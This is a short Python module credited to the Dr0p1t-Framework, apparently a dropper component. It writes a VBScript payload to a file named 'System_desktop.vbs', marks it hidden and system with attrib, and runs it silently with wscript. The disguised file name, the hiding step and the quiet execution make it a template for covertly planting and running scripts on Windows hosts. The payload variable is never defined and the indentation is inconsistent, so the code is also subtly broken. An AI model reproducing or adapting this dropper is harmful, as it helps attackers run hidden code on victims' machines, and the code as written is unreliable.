#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This module aims to run vbs scripts
#Start
from os import popen
def F522F(tobe):
    f = open("System_desktop.vbs","w")
    f.write(tobe)
    f.close()
	xxx = popen("attrib +s +h System_desktop.vbs")
    blah = popen( "wscript System_desktop.vbs > nul" )

F522F(Vbs_Script_Data)
